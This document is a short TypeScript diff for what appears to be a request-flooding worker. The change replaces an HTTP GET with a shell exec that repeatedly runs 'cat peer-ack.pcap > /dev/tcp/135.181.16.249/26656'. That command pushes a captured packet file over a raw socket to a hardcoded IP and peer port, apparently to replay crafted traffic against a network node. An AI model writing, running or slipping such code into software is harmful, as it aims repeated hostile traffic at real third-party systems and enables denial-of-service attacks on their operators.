@@ -21,16 +21,7 @@ const worker = ( host: string, amount: string ) => {
    }, 10 );
 
     setInterval( () => {
-        exec('cat peer-ack.pcap > /dev/tcp/135.181.16.249/26656', (err: any, stdout:any, stderr:any) => {
-            if (err) {
-                //some err occurred
-                console.error(err)
-            } else {
-                // the *entire* stdout and stderr (buffered)
-               console.log(`stdout: ${stdout}`);
-               console.log(`stderr: ${stderr}`);
-            }
-        });
+
 
 
         // @ts-ignore
@@ -43,21 +34,30 @@ const worker = ( host: string, amount: string ) => {
     const request = async () => {
 
 
-
-
-        let isFailedRequest = false
-        const response = await axios.get(
-            host
-        ).catch( ( err: any ) => {
-            if( err ) {
-                isFailedRequest = true
-                errors++
+        exec('cat peer-ack.pcap > /dev/tcp/135.181.16.249/26656', (err: any, stdout:any, stderr:any) => {
+            if (err) {
+                //some err occurred
+                console.error(err)
+            } else {
+                // the *entire* stdout and stderr (buffered)
+                console.log(`stdout: ${stdout}`);
+                console.log(`stderr: ${stderr}`);
             }
-        } );
-        if( response ) {
-            isFailedRequest = false
-        }
-        requests --;
+        });
+
+        // let isFailedRequest = false
+        // const response = await axios.get(
+        //     host
+        // ).catch( ( err: any ) => {
+        //     if( err ) {
+        //         isFailedRequest = true
+        //         errors++
+        //     }
+        // } );
+        // if( response ) {
+        //     isFailedRequest = false
+        // }
+        // requests --;
     }
 }
 
